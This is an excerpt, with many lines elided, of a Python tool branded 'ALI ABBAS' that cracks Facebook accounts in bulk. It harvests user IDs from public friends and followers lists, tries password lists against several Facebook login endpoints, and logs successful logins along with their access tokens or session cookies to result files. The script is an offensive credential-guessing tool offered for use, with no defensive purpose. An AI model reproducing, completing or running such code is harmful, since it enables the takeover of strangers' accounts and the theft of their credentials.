...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 ALI ABBAS 🔥].  ║
\x1b[0;33m║       TOOL AUTHOR [ALI ABBAS]. ║
\x1b[0;33m╚════════════════════════════════════════════╝
...
\x1b[0;33m║#FACEBOOK : NAME Ali Abbas     ║
...
def menu():
	...
	print("\n\033[1;93m[\033[1;94m01\033[1;97m] CRACK-ALI ID FROM PUBLIC FRIENDS")

	print("\033[1;93m[\033[1;94m02\033[1;97m] CRACK-ALI ID FROM PUBLIC FOLLOWERS")

	print("\033[1;93m[\033[1;94m03\033[1;97m] MULTIPLE-ID's CRACK-ALI\033[1;93m [ \033[1;95mPRO \033[1;97m]")

	print("\033[1;93m[\033[1;94m04\033[1;97m] Chack CRACK-ALI Results")
	...
	if ALI =="":
		...
		print("\n\033[1;92m[\033[1;93m01\033[1;96m] CHECK CRACK-ALI RESULTS OK")
		...
		if cek =="":
			...
			print(" CRACK-ALI Resulte : %s Total : %s\033[0;92m"%(del_txt, len(Totalok)))
			...
			print(" CRACK-ALI RESULTS : %s TOTAL : %s\033[0;93m"%(del_txt, len(Totalcp)))
...
def massal():
	...
	try:
		...
		ali_Total = int(input("\033[1;96m[\033[1;94m+\033[1;96m] ENTER OPTION ID'S [HOW MANY] : "))
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mALI PRO/FASTER \033[1;97m]")
	...
	if method == "":
		...
		ask = raw_input("\033[1;96m[\033[1;94m!\033[1;97m] DO YOU CHOOSE MANUAL PASSWORD y/n\033[1;97m [ \033[1;96mDefault : t \033[1;97m] ")
...
def cek_ttl_cp(uid, pw):
	...
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;95m[ALI-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
...
def bapi(user):
	...
	sys.stdout.write(
		...
		"\r\033[0;91m[\033[0;92mCRACK\033[0;91m]\033[0;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[ALI-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
...
def mbasic(user):
	...
	sys.stdout.write(
		...
		"\r\033[0;91m[\033[0;92mCRACK-ALIing\033[0;92m]\033[0;93m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[ALI-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))

				ok.append("%s|%s"%(uid, pw))

				open("OK/%s.txt"%(tALI),"a").write(" + %s|%s\n"%(uid, pw))
...
def mobile(user):
	...
	sys.stdout.write(
		...
		"\r\033[0;91m[\033[0;92mCRACK\033[0;93m]\033[0;95m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[ALI-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
...
def manual():
	...
	print("[+] Enter 2-4 Passwords For Fast CRACK-ALIing Speed\n")
	...
	def main(user):
		...
		sys.stdout.write(
			...
			"\r\033[0;92m[\033[0;96mCRACK-ALIing\033[0;92m]\033[0;96m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
